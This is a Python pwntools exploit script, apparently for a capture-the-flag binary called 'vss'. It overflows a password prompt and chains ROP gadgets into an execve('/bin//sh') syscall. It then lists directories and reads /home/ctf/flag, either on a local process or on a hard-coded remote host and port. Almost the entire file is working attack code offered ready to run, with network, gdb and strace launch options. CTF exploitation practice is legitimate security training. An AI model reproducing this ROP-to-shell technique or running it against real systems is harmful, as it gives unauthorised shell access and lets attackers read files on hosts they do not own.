#!/usr/bin/env python
import sys
import struct
from pwn import *

####################################################
##################### EXPLOIT ######################
####################################################
#FILE 	= './vss_72e30bb98bdfbf22307133c16f8c9966'
FILE 	= './vss_timer_disabled'
F_PARAM = [] #file arguments(if any) go here
HOST 	= '121.40.56.102'
PORT 	= '2333'


def getpayload():
	# secret backdoor password
	p = 'py'

	# Padding goes here
	p += 'A'*70

	# Due to the null bytes, the first address gets seperated from rest of
	# ropchain.  So we pick this gadget first, it increments the rsp by 72 bytes
	# to move the stack pointer to the start of our ropchain.
	p += struct.pack('<Q', 0x000000000046f175) # add rsp, 0x48 ; ret

	# Since the above address gets hit twice, we have to pad another 0x48 bytes
	p += 'A'*0x48

	# auto-generate rop-chain
	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4080) # @ .data
	p += struct.pack('<Q', 0x000000000046f208) # pop rax ; ret
	p += '/bin//sh'
	p += struct.pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
	p += struct.pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
	p += struct.pack('<Q', 0x0000000000401823) # pop rdi ; ret
	p += struct.pack('<Q', 0x00000000006c4080) # @ .data
	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000043ae05) # pop rdx ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x00000000004004b8) # syscall

	return p



def pwn(p):
	print(p.recvuntil('Password:\n'))
	p.sendline(getpayload())

	p.sendline('ls')
	print(p.recv())
	p.sendline('ls /home/')
	print(p.recv())
	p.sendline('ls /home/ctf/')
	print(p.recv())
	p.sendline('cat /home/ctf/flag')
	print(p.recv())



####################################################
##################### TEMPLATE #####################
####################################################
USAGE = """
Options:
\t[-n, --network]\tPerform attack on live (n)etwork (Default: local binary file)
\t[-g, --gdb]\t\tLaunch binary with GDB Server (Can not be used against a live network target)
\t[-s, --strace]\t\tLaunch binary via strace (Can not be used against a live network target)
"""
GDBPORT = 4200

def launch_pwn(attack_network, gdb_server, strace):
	p = None
	if attack_network:
		p = remote(HOST, PORT)
	else:
		if gdb_server:
			fileparams = ['/usr/bin/gdbserver', 'localhost:%d' % GDBPORT, FILE]
		elif strace:
			fileparams = ['/usr/bin/strace', FILE]
		else:
			fileparams = [FILE]

		for arg in F_PARAM:
			fileparams.append(arg)

		p = process(fileparams)
	try:
		pwn(p)
	except Exception as e:
		#TODO, real exception handling or something
		print('Exception ocurred: %s' % str(e))
		p.clean_and_log()
		raise e
	p.clean_and_log()


def main():
	gdb_server 		= False
	strace			= False
	attack_network 	= False
	for i in sys.argv:
		if i == '-g' or i == '--gdb':
			gdb_server = True
		elif i == '-n' or i == '--network':
			attack_network = True
		elif i == '-s' or i == '--strace':
			strace = True
		elif i == sys.argv[0]:
			pass
		else:
			usage()
			exit()

	launch_pwn(attack_network, gdb_server, strace)


def usage():
	print('Usage ./%s [OPTIONS]%s' % (sys.argv[0], USAGE))


if __name__ == "__main__":
	main()
